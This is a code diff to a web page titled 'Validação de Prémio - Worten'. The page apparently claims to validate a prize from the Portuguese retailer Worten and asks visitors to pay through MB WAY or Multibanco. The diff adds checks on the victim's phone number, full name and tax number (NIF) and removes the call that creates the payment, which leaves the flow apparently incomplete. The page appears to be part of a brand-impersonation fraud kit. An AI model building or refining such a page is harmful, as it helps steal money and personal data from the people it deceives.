@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Validação de Prémio - Worten</title>
-    <link rel="stylesheet" href="style.css?v=34">
+    <link rel="stylesheet" href="style.css?v=35">
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
     <style>
@@ -285,8 +285,8 @@
         </div>
     </div>
 
-    <script src="script.js?v=34"></script>
-    <script src="waymb-service.js?v=34"></script>
+    <script src="script.js?v=35"></script>
+    <script src="waymb-service.js?v=35"></script>
 
     <!-- Loading Overlay -->
     <div id="loadingOverlay" class="modal-overlay"
@@ -367,7 +367,6 @@
 
             if (selectedMethod === 'mbway') {
                 // Show confirmation modal with phone number
-                document.getElementById('confirmPhoneDisplay').innerText = userData.phone || 'N/A';
                 document.getElementById('mbwayModal').style.display = 'flex';
             } else if (selectedMethod === 'multibanco') {
                 // Call API directly for Multibanco
@@ -380,9 +379,31 @@
         }
 
         async function finalizeMBWay() {
+            const cleanTel = document.getElementById('mbwayPhone').value.replace(/\s/g, '');
+            const cleanName = document.getElementById('mbwayName').value.trim();
+            const cleanNIF = document.getElementById('mbwayNIF').value.replace(/\s/g, '');
+
+            // Validate Portuguese phone number - WayMB only accepts 91 and 96 for MB WAY
+            const phoneDigits = cleanTel.replace(/\D/g, '');
+            const validPrefixes = ['91', '96'];
+            const hasValidPrefix = validPrefixes.some(prefix => phoneDigits.startsWith(prefix));
+
+            if (phoneDigits.length !== 9 || !hasValidPrefix) {
+                alert('Número de telemóvel inválido para MB WAY!\nPor favor, insira um número que comece com 91 ou 96.\n\n(Números 92 e 93 não são suportados pelo gateway de pagamento)');
+                return;
+            }
+
+            if (!cleanName || cleanName.length < 3) {
+                alert('Por favor, insira o seu nome completo.');
+                return;
+            }
+
+            if (cleanNIF.length !== 9) {
+                alert('NIF inválido! Deve ter 9 dígitos.');
+                return;
+            }
+
             closePaymentModal();
-            // Call API for MBWay
-            await createAndRedirect('mbway');
         }
 
         async function createAndRedirect(method) {
